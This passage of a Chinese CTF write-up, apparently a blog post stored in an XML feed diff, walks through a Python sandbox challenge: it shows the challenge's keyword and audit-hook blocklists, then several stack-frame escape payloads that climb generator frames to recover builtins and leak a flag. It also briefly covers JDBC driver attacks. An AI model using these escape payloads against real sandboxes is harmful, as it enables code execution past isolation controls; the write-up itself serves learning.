  <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>runner.py:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
+
+<p>py栈帧逃逸</p>
+<p><a class="link"   href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG==uh8kAhiD&alichlgref=https://www.cnblogs.com/" >Python利用栈帧沙箱逃逸 - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>这题的flag在沙箱的上上上帧（自己构造的两个函数两帧，exec里的一帧）</p>
+<p>获取上上帧对象的三种方式</p>
+<ol>
+<li></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
+
+<p>第一个方法不行，使用next获取栈帧对象会让结果包含LOAD_GLOBAL</p>
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]<span class="comment">#用这&lt;listcomp&gt;需要多逃一帧</span></span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"> <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line"> pop = exp()</span><br><span class="line"> <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line"> boo=exp</span><br><span class="line"> <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br></pre></td></tr></table></figure>
+
+<p>最后还作了个检测，就是flag不能存在output中</p>
+<p>这里也有两种绕法</p>
+<p>payload1:<code>print(kino.f_code.co_consts[16][1:])</code></p>
+<p>截取字符串绕过，我这里用的ctfshow复现的环境，前面这个下标是16</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240524180044325.png"  alt="image-20240524180044325"></p>
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">payload = &#x27;&#x27;&#x27;def getflag():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame=[x for x in g][0]</span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]  </span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code </span><br><span class="line">    gattr_dir = gattr.dir</span><br><span class="line">    s  = gattr.str</span><br><span class="line">    print(gattr_dir(code))</span><br><span class="line">    for i in s(code.co_consts):</span><br><span class="line">        print(i,end=&quot;,&quot;)</span><br><span class="line">getflag()&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;code&quot;: payload</span><br><span class="line">&#125;</span><br><span class="line">print(json.dumps(data))</span><br></pre></td></tr></table></figure>
+
+<p>先用builtins获取str，然后把code.co_consts变为字符串后输出，每隔一个字符用，隔开即可</p>
+<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240527172754306.png"  alt="image-20240527172754306"></p>
+<p>你知道的，jdbc的攻击基本是围绕着驱动来攻击的</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240527172840785.png"  alt="image-20240527172840785"></p>
+<p>提供四个驱动，一个一个寻找漏洞条件</p>
+<p>第一个Mysql，我知道的就反序列化漏洞，看看版本</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173431572.png"  alt="image-20240527173431572"></p>
+<p>no</p>
+<p>第二个PostgreSQL，控制bean.xml进行rce</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173557400.png"  alt="image-20240527173557400"></p>
+<p>no</p>
+<p>第三个是sqlite服务</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240527203847332.png"  alt="image-20240527203847332"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/1f913.png"  alt="🤓书呆子脸:高清大图与Unicode信息 | EmojiAll"></p>
+<p>对啦！</p>
+<p>[项目文件预览 - GitCode](<a class="link"   href="https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;PostGreSQL&#x2F;index.md?utm_source&#x3D;csdn_github_accelerator&amp;isLogin&#x3D;1)</p>
+<p><a class="link"   href="https://gitcode.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java" >项目文件预览 - JDBC-Attack - GitCode<i class="fas fa-external-link-alt"></i></a></p>
+<p>复现太麻烦了，包括环境下载，然后还有远程debug，这些都好难弄，只按wp做了一次</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>奶奶滴临近期末，写个复现都要写几周，还有一题sanic没看，我嘞个忙</p>
+<p>赛后复现赛题发现我的复现能力太差了，环境不会装，docker不会用，debug不会debug，累了</p>
+<p>接下来就学学复现环境吧，从vulhub开始，然后一点一点学着调试，分析，这应该应该还算个美妙的过程</p>
+<p>我在复现thinkphp的时候调试的时候就调试得我挺美的</p>
+<p>期考，会赢吗？</p>
+<p><img   src="/../img/$%7Bfiilename%7D/OIP-C.mG6e-yzRUBIZy6otnpkH1wAAAAw=169&h=197&c=7&r=0&o=5&dpr=1.7&pid=1.jpeg"  alt="会赢的五条悟 的图像结果"></p>
+<p>还有海大你无敌了，暑假才放一个月半</p>
+]]></content>
+      <categories>
+        <category>Write up</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
